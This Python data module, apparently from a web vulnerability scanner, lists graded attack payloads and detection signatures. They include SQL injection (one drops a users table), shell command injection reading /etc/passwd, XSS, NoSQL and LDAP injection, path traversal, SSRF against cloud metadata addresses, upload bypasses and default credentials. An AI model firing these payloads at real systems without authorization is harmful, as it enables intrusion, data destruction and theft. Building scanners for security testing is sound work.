"""Centralized payload library with context-aware variants for all vulnerability types."""

# ── SQL Injection Payloads ────────────────────────────────────────────────────

SQLI_PAYLOADS = {
    # Depth 1: Basic detection
    1: {
        "error_based": [
            "'",
            "' OR '1'='1",
            '" OR "1"="1',
        ],
    },
    # Depth 2: Extended detection
    2: {
        "error_based": [
            "'",
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1--",
            "' OR 1=1#",
            "admin'--",
        ],
        "time_based": [
            "1' AND SLEEP(2)--",
            "1' AND SLEEP(3)--",
            "1; WAITFOR DELAY '0:0:2'--",
        ],
        "union_based": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ],
    },
    # Depth 3: Advanced + database fingerprinting
    3: {
        "error_based": [
            "'",
            "' OR '1'='1",
            '" OR "1"="1',
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "admin'--",
            "' AND 1=2 UNION SELECT table_name,NULL FROM information_schema.tables--",
        ],
        "time_based": [
            "1' AND SLEEP(2)--",
            "1' AND SLEEP(3)--",
            "1; WAITFOR DELAY '0:0:2'--",
            "1' AND BENCHMARK(5000000,SHA1('test'))--",
        ],
        "blind_boolean": [
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' AND '1'='1",
            "1' AND '1'='2",
        ],
        "union_based": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT version(),NULL--",
            "' UNION SELECT user(),version()--",
        ],
    },
}

# ── Command Injection Payloads ────────────────────────────────────────────────

COMMAND_PAYLOADS = {
    1: [
        ";id",
        "|id",
        "||id",
        "&id",
        "&&id",
    ],
    2: [
        ";id;",
        "|id|",
        "; whoami",
        "| whoami",
        "$(whoami)",
        "`whoami`",
        "| cat /etc/passwd",
        "| type C:\\windows\\win.ini",
    ],
    3: [
        ";id;",
        "|id|",
        "; whoami",
        "| whoami",
        "$(whoami)",
        "`whoami`",
        "| cat /etc/passwd",
        "| type C:\\windows\\win.ini",
        "\n/bin/bash -c 'id'",
        "\nid\n",
        "'; exec('id'); //",
    ],
}

# ── XSS Payloads ─────────────────────────────────────────────────────────────

XSS_PAYLOADS = {
    1: {
        "html_context": [
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
        ],
        "attribute_context": [
            '" onload="alert(1)',
            "' onerror='alert(1)",
        ],
    },
    2: {
        "html_context": [
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe onload=alert(1)>',
        ],
        "attribute_context": [
            '" onload="alert(1)',
            "' onerror='alert(1)",
            'javascript:alert(1)',
        ],
        "js_context": [
            "';alert(1)//",
            "\";alert(1)//",
            "');alert(1);//",
        ],
        "css_context": [
            "*/alert(1)/*",
            "{background:url('javascript:alert(1)')}",
        ],
    },
    3: {
        "html_context": [
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
        ],
        "attribute_context": [
            '" onload="alert(1)',
            "' onerror='alert(1)",
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
        ],
        "js_context": [
            "';alert(1)//",
            "\";alert(1)//",
            "');alert(1);//",
            'eval("alert(1)")',
            'Function("alert(1)")()',
        ],
        "event_handler": [
            '<img src=x:alert(1)>',
            '"><svg/onload=alert(1)>',
            '<img src=x onerror="eval(atob(\'YWxlcnQoMSkK\'))">',
        ],
    },
}

# ── NoSQL Injection Payloads ──────────────────────────────────────────────────

NOSQL_PAYLOADS = {
    1: [
        "{'$ne':null}",
        "{\"$ne\":null}",
        "{'$gt':''}",
        "{\"$gt\":\"\"}",
    ],
    2: [
        "{'$ne':null}",
        "{\"$ne\":null}",
        "{'$gt':''}",
        "{\"$gt\":\"\"}",
        "{'$regex':'.*'}",
        "{\"$regex\":\".*\"}",
        "admin'}, {$where:'1==1",
    ],
    3: [
        "{'$ne':null}",
        "{\"$ne\":null}",
        "{'$gt':''}",
        "{\"$gt\":\"\"}",
        "{'$regex':'.*'}",
        "{\"$regex\":\".*\"}",
        "admin'}, {$where:'1==1",
        "{\"$or\":[{},{'_id':0}]}",
        "{\"$where\":\"function(){return true}\"}",
        "'; return true; db.users.find();//",
    ],
}

# ── LDAP Injection Payloads ───────────────────────────────────────────────────

LDAP_PAYLOADS = {
    1: [
        "*",
        "*)(uid=*",
        "*)(objectClass=*",
    ],
    2: [
        "*",
        "*)(uid=*",
        "*)(objectClass=*",
        "admin*)(&",
        "*",
    ],
    3: [
        "*",
        "*)(uid=*",
        "*)(objectClass=*",
        "admin*)(&",
        "*",
        "*))(|(uid=*",
        "*)(|(cn=*",
    ],
}

# ── Path Traversal Payloads ───────────────────────────────────────────────────

PATH_TRAVERSAL_PAYLOADS = [
    "/../../../etc/passwd",
    "/../../etc/passwd",
    "....//....//etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....\\\\....\\\\windows\\\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%afetc%c0%afpasswd",
]

# ── Open Redirect Payloads ────────────────────────────────────────────────────

REDIRECT_PARAMS = [
    "redirect",
    "url",
    "next",
    "return",
    "returnTo",
    "goto",
    "dest",
    "destination",
    "redir",
    "target",
    "continue",
    "forward",
    "back",
    "callback",
    "retUrl",
]

REDIRECT_PAYLOADS = [
    "https://evil.example.com",
    "//evil.example.com",
    "///evil.example.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]

# ── SSRF Payloads ────────────────────────────────────────────────────────────

SSRF_PAYLOADS = {
    "internal_urls": [
        "http://127.0.0.1",
        "http://127.0.0.1:8080",
        "http://localhost",
        "http://localhost:8080",
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
        "http://169.254.169.254",
        "http://169.254.169.254/latest/meta-data/",
        "gopher://127.0.0.1:25",
        "dict://127.0.0.1:11211",
        "file:///etc/passwd",
    ],
    "bypass_payloads": [
        "http://127.0.0.1.xip.io",
        "http://127.1",
        "http://2130706433",
        "http://0177.0.0.1",
    ],
}

# ── Security Headers to Check ────────────────────────────────────────────────

SECURITY_HEADERS = [
    ("Strict-Transport-Security", "HSTS missing — susceptible to SSL-stripping"),
    ("Content-Security-Policy", "CSP missing — XSS risk elevated"),
    ("X-Frame-Options", "Clickjacking protection missing"),
    ("X-Content-Type-Options", "MIME-type sniffing not blocked"),
    ("Referrer-Policy", "Referrer header leakage possible"),
    ("Permissions-Policy", "Permissions-Policy header absent"),
    ("X-XSS-Protection", "X-XSS-Protection header missing"),
]

# ── Common Default Credentials ────────────────────────────────────────────────

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("root", "root"),
    ("root", "password"),
    ("test", "test"),
    ("guest", "guest"),
]

# ── Debug Endpoints ──────────────────────────────────────────────────────────

DEBUG_ENDPOINTS = [
    "/debug",
    "/admin",
    "/actuator",
    "/actuator/health",
    "/status",
    "/.env",
    "/.git",
    "/.git/config",
    "/web.config",
    "/config.php",
    "/wp-admin",
    "/phpmyadmin",
    "/.well-known/",
]

# ── PII Detection Patterns ────────────────────────────────────────────────────

PII_PATTERNS = {
    "ssn": r"\b\d{3}-\d{2}-\d{4}\b",
    "credit_card": r"\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b",
    "phone": r"\b\d{3}[-.\s]?\d{3}[-.\s]?\d{4}\b",
    "email": r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b",
    "ip_address": r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
}

# ── API Key Patterns ─────────────────────────────────────────────────────────

API_KEY_PATTERNS = {
    "aws": r"(?i)(aws_access_key_id|aws_secret_access_key)",
    "github": r"(?i)(gh[opu]_[0-9a-zA-Z]{36,255})",
    "stripe": r"(?i)(sk_live_[0-9a-zA-Z]{24}|pk_live_[0-9a-zA-Z]{24})",
    "slack": r"(?i)(xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[0-9a-zA-Z]{24,26})",
    "google": r"(?i)(AIza[0-9A-Za-z\-_]{35})",
    "azure": r"(?i)(azure.*key|account.key)",
    "private_key": r"(?i)(-----BEGIN.*PRIVATE KEY)",
}

# ── File Upload Bypass Techniques ────────────────────────────────────────────

FILE_UPLOAD_BYPASSES = {
    "extension": [
        ".php.jpg",
        ".php.png",
        ".php%00.jpg",
        ".phtml",
        ".php3",
        ".php4",
        ".php5",
        ".phar",
    ],
    "mime_type": [
        "image/jpeg",
        "image/png",
        "image/gif",
    ],
    "content": [
        b"\xFF\xD8\xFF\xE0",
        b"\x89PNG\r\n\x1a\n",
    ],
}

# ── SQL Error Signatures ─────────────────────────────────────────────────────

SQLI_ERROR_SIGNATURES = {
    "mysql": [
        "sql syntax",
        "mysql_fetch",
        "mysql_error",
        "you have an error in your sql syntax",
        "warning: mysql",
    ],
    "postgresql": [
        "pg_query",
        "postgresql",
        "server closed the connection unexpectedly",
    ],
    "mssql": [
        "sql server",
        "syntax error near",
        "oledb provider",
    ],
    "sqlite": [
        "sqlite3",
        "near",
        "syntax error",
    ],
    "oracle": [
        "ora-",
        "oracle error",
        "pls-",
    ],
}

# ── Command Execution Signatures ─────────────────────────────────────────────

COMMAND_EXEC_SIGNATURES = {
    "unix": [
        "root:x:",
        "/bin/bash",
        "/bin/sh",
        "uid=",
        "gid=",
    ],
    "windows": [
        "[fonts]",
        "[drivers]",
        "C:\\",
        "Windows\\System32",
    ],
}
